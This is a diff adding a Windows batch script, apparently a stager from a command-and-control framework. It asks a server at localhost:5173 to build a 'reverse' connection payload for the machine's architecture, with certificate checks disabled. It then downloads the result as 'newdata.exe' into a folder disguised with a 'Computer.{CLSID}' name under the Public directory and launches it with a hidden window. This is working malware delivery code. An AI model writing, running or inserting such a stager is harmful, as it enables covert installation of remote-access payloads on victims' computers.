@@ -1,0 +1,28 @@
+@echo off&chcp 65001>nul&setlocal enabledelayedexpansion
+call:i&call:m
+endlocal&exit/b
+:i
+set "A=http://localhost:5173"&set "L=4d66ad15-2e6d-4d0d-b237-5cf727a10b73"&set "O=windows"&set "T=reverse"
+set "P=%PROCESSOR_ARCHITECTURE%"
+if /i "%P%"=="AMD64" set "R=amd64"&goto:eof
+if /i "%P%"=="ARM64" set "R=arm64"&goto:eof
+set "R=386"
+goto:eof
+:m
+call:b
+call:f
+if not defined D exit/b 1
+set "U=%A%%D%"
+call:d
+call:s
+goto:eof
+:b
+set "J={\"os\":\"%O%\",\"arch\":\"%R%\",\"listener_id\":\"%L%\",\"connection_type\":\"%T%\"}"&goto:eof
+:f
+set "D="&set "N="
+for /f "delims=" %%l in ('powershell "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$h=@{'Content-Type'='application/json'};$b='%J%';try{$r=Invoke-RestMethod -Uri '%A%/api/v1/build' -Method Post -Headers $h -Body $b -TimeoutSec 10;$r.download_url;$r.filename}catch{exit 1}"') do if not defined D (set "D=%%l")else set "N=%%l"&goto:eof
+:d
+powershell "$folder = Join-Path $env:PUBLIC 'Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}';New-Item -Path $folder -ItemType Directory -Force | Out-Null;$saveFile = Join-Path $folder 'newdata.exe';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};try{Invoke-WebRequest -Uri '%U%' -OutFile $saveFile -TimeoutSec 10}catch{}"&goto:eof
+:s
+powershell "$exePath = Join-Path $env:PUBLIC 'Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\newdata.exe';if(Test-Path $exePath){Start-Process -FilePath $exePath -WindowStyle Hidden}else{}"
+goto:eof
